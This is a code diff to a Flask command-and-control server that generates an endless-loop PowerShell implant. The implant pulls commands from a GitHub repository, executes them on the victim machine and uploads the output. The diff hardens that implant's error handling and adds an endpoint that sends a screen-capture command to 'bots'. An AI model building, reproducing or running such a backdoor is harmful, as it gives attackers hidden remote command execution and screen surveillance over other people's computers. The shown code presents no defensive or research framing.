@@ -288,8 +288,8 @@ def get_delivery_formats():
         print(f"Bot created successfully with UUID: {bot_uuid}")
         print(f"Bot stored in MongoDB with ID: {bot_result.inserted_id}")
         
-        # Generate the dynamic PowerShell command with infinite loop
-        dynamic_powershell_command = f'$RepoOwner="{github_username}";$RepoName="{github_repo}";$BotID="{bot_uuid}";$PAT="{github_pat}";$AuthHeader=@{{Authorization="token $PAT"}};$CmdUrl="https://api.github.com/repos/$RepoOwner/$RepoName/contents/commands/$BotID.txt";$ResUrl="https://api.github.com/repos/$RepoOwner/$RepoName/contents/results/$BotID.txt";while($true){{try{{$resp=Invoke-RestMethod -Uri $CmdUrl -Headers $AuthHeader;$cmds=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($resp.content)) -split "`n";$cmdSha=$resp.sha}}catch{{$cmds=@();$cmdSha=$null}};$results=@();foreach($c in $cmds){{if(-not [string]::IsNullOrWhiteSpace($c)){{try{{$results+=(&([ScriptBlock]::Create($c)) | Out-String)}}catch{{$results+=$_.Exception.Message}}}}}};$resultContent=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($results -join "`n")));try{{$existing=Invoke-RestMethod -Uri $ResUrl -Headers $AuthHeader;$sha=$existing.sha}}catch{{$sha=$null}};$putBody=@{{message="Update $BotID results";content=$resultContent}};if($sha){{$putBody.sha=$sha}};Invoke-RestMethod -Uri $ResUrl -Method Put -Headers $AuthHeader -Body ($putBody|ConvertTo-Json);if($cmdSha){{$clearBody=@{{message="Clear $BotID commands";content=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(""));sha=$cmdSha}};Invoke-RestMethod -Uri $CmdUrl -Method Put -Headers $AuthHeader -Body ($clearBody|ConvertTo-Json)}};Start-Sleep -Seconds 5}}'
+        # Generate the dynamic PowerShell command with infinite loop and SHA handling
+        dynamic_powershell_command = f'$RepoOwner="{github_username}";$RepoName="{github_repo}";$BotID="{bot_uuid}";$PAT="{github_pat}";$AuthHeader=@{{Authorization="token $PAT"}};$CmdUrl="https://api.github.com/repos/$RepoOwner/$RepoName/contents/commands/$BotID.txt";$ResUrl="https://api.github.com/repos/$RepoOwner/$RepoName/contents/results/$BotID.txt";while($true){{try{{$resp=Invoke-RestMethod -Uri $CmdUrl -Headers $AuthHeader;$cmds=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($resp.content)) -split "`n";$cmdSha=$resp.sha}}catch{{$cmds=@();$cmdSha=$null}};$results=@();foreach($c in $cmds){{if(-not [string]::IsNullOrWhiteSpace($c)){{try{{$results+=(&([ScriptBlock]::Create($c)) | Out-String)}}catch{{$results+=$_.Exception.Message}}}}}};$resultContent=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($results -join "`n")));try{{$existing=Invoke-RestMethod -Uri $ResUrl -Headers $AuthHeader;$sha=$existing.sha}}catch{{$sha=$null}};$putBody=@{{message="Update $BotID results";content=$resultContent}};if($sha){{$putBody.sha=$sha}};try{{Invoke-RestMethod -Uri $ResUrl -Method Put -Headers $AuthHeader -Body ($putBody|ConvertTo-Json)}}catch{{Write-Host "Results update failed: $($_.Exception.Message)"}};if($cmdSha){{$clearBody=@{{message="Clear $BotID commands";content=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(""));sha=$cmdSha}};try{{Invoke-RestMethod -Uri $CmdUrl -Method Put -Headers $AuthHeader -Body ($clearBody|ConvertTo-Json)}}catch{{Write-Host "Commands clear failed: $($_.Exception.Message)"}}}};Start-Sleep -Seconds 5}}'
         
         # LOLBin commands for each platform
         lolbin_commands = {
@@ -441,8 +441,8 @@ def create_agent():
             print(f"Failed to create results file: {results_response.status_code} - {results_response.text}")
             return jsonify({"status": "error", "message": f"Failed to create results file: {results_response.status_code}"}), 500
         
-        # Generate PowerShell command with the new UUID using the specific format with infinite loop
-        powershell_command = f'$RepoOwner="{github_username}";$RepoName="{github_repo}";$BotID="{agent_uuid}";$PAT="{github_pat}";$AuthHeader=@{{Authorization="token $PAT"}};$CmdUrl="https://api.github.com/repos/$RepoOwner/$RepoName/contents/commands/$BotID.txt";$ResUrl="https://api.github.com/repos/$RepoOwner/$RepoName/contents/results/$BotID.txt";while($true){{try{{$resp=Invoke-RestMethod -Uri $CmdUrl -Headers $AuthHeader;$cmds=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($resp.content)) -split "`n";$cmdSha=$resp.sha}}catch{{$cmds=@();$cmdSha=$null}};$results=@();foreach($c in $cmds){{if(-not [string]::IsNullOrWhiteSpace($c)){{try{{$results+=(&([ScriptBlock]::Create($c)) | Out-String)}}catch{{$results+=$_.Exception.Message}}}}}};$resultContent=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($results -join "`n")));try{{$existing=Invoke-RestMethod -Uri $ResUrl -Headers $AuthHeader;$sha=$existing.sha}}catch{{$sha=$null}};$putBody=@{{message="Update $BotID results";content=$resultContent}};if($sha){{$putBody.sha=$sha}};Invoke-RestMethod -Uri $ResUrl -Method Put -Headers $AuthHeader -Body ($putBody|ConvertTo-Json);if($cmdSha){{$clearBody=@{{message="Clear $BotID commands";content=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(""));sha=$cmdSha}};Invoke-RestMethod -Uri $CmdUrl -Method Put -Headers $AuthHeader -Body ($clearBody|ConvertTo-Json)}};Start-Sleep -Seconds 5}}'
+        # Generate PowerShell command with the new UUID using the specific format with infinite loop and SHA handling
+        powershell_command = f'$RepoOwner="{github_username}";$RepoName="{github_repo}";$BotID="{agent_uuid}";$PAT="{github_pat}";$AuthHeader=@{{Authorization="token $PAT"}};$CmdUrl="https://api.github.com/repos/$RepoOwner/$RepoName/contents/commands/$BotID.txt";$ResUrl="https://api.github.com/repos/$RepoOwner/$RepoName/contents/results/$BotID.txt";while($true){{try{{$resp=Invoke-RestMethod -Uri $CmdUrl -Headers $AuthHeader;$cmds=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($resp.content)) -split "`n";$cmdSha=$resp.sha}}catch{{$cmds=@();$cmdSha=$null}};$results=@();foreach($c in $cmds){{if(-not [string]::IsNullOrWhiteSpace($c)){{try{{$results+=(&([ScriptBlock]::Create($c)) | Out-String)}}catch{{$results+=$_.Exception.Message}}}}}};$resultContent=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($results -join "`n")));try{{$existing=Invoke-RestMethod -Uri $ResUrl -Headers $AuthHeader;$sha=$existing.sha}}catch{{$sha=$null}};$putBody=@{{message="Update $BotID results";content=$resultContent}};if($sha){{$putBody.sha=$sha}};try{{Invoke-RestMethod -Uri $ResUrl -Method Put -Headers $AuthHeader -Body ($putBody|ConvertTo-Json)}}catch{{Write-Host "Results update failed: $($_.Exception.Message)"}};if($cmdSha){{$clearBody=@{{message="Clear $BotID commands";content=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(""));sha=$cmdSha}};try{{Invoke-RestMethod -Uri $CmdUrl -Method Put -Headers $AuthHeader -Body ($clearBody|ConvertTo-Json)}}catch{{Write-Host "Commands clear failed: $($_.Exception.Message)"}}}};Start-Sleep -Seconds 5}}'
         
         # Store agent information in MongoDB
         agent_data = {
@@ -670,6 +670,90 @@ def get_results():
         
     except Exception as e:
         print(f"Error in get_results: {str(e)}")
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+@app.route("/screenshot", methods=["POST"])
+def take_screenshot():
+    """Take a screenshot of the target machine using PowerShell"""
+    try:
+        data = request.get_json()
+        print(f"Taking screenshot with data: {data}")
+        
+        if not data:
+            return jsonify({"status": "error", "message": "No data provided"}), 400
+        
+        bot_uuid = data.get("bot_uuid")
+        username = data.get("username", "admin")
+        
+        if not bot_uuid:
+            return jsonify({"status": "error", "message": "Bot UUID is required"}), 400
+        
+        # Get bot information from MongoDB
+        bots = db["bots"]
+        bot = bots.find_one({"uuid": bot_uuid, "username": username})
+        
+        if not bot:
+            return jsonify({"status": "error", "message": "Bot not found"}), 404
+        
+        # Get GitHub configuration
+        user_config = configs.find_one({"username": username})
+        if not user_config:
+            return jsonify({"status": "error", "message": "User configuration not found"}), 404
+        
+        github_pat = user_config.get("github_pat")
+        github_username = user_config.get("github_username")
+        github_repo = user_config.get("github_repo")
+        
+        if not all([github_pat, github_username, github_repo]):
+            return jsonify({"status": "error", "message": "GitHub configuration incomplete"}), 400
+        
+        # Create GitHub API headers
+        headers = {
+            "Authorization": f"token {github_pat}",
+            "Accept": "application/vnd.github.v3+json"
+        }
+        
+        # PowerShell screenshot command that captures screen and returns base64
+        screenshot_command = '''Add-Type -AssemblyName System.Drawing, System.Windows.Forms; $b = New-Object Drawing.Bitmap ([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); [Drawing.Graphics]::FromImage($b).CopyFromScreen([Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [Drawing.Point]::Empty, $b.Size); $ms = New-Object IO.MemoryStream; $b.Save($ms, [Drawing.Imaging.ImageFormat]::Png); [Convert]::ToBase64String($ms.ToArray())'''
+        
+        # Get current commands file content
+        commands_url = f"https://api.github.com/repos/{github_username}/{github_repo}/contents/commands/{bot_uuid}.txt"
+        commands_response = requests.get(commands_url, headers=headers)
+        
+        if commands_response.status_code != 200:
+            return jsonify({"status": "error", "message": "Failed to access commands file"}), 500
+        
+        current_content = commands_response.json()
+        current_sha = current_content["sha"]
+        
+        # Prepare new content with the screenshot command
+        new_content = f"{screenshot_command}\n"
+        encoded_content = base64.b64encode(new_content.encode()).decode()
+        
+        # Update commands file
+        update_data = {
+            "message": f"Add screenshot command for bot {bot_uuid}",
+            "content": encoded_content,
+            "sha": current_sha
+        }
+        
+        update_response = requests.put(commands_url, headers=headers, json=update_data)
+        
+        if update_response.status_code not in [200, 201]:
+            print(f"Failed to update commands file: {update_response.status_code} - {update_response.text}")
+            return jsonify({"status": "error", "message": "Failed to write screenshot command to GitHub"}), 500
+        
+        print(f"Screenshot command sent to bot {bot_uuid}")
+        
+        return jsonify({
+            "status": "success",
+            "message": "Screenshot command sent successfully",
+            "bot_uuid": bot_uuid,
+            "command": "screenshot"
+        })
+        
+    except Exception as e:
+        print(f"Error in take_screenshot: {str(e)}")
         return jsonify({"status": "error", "message": str(e)}), 500
 
 if __name__ == "__main__":
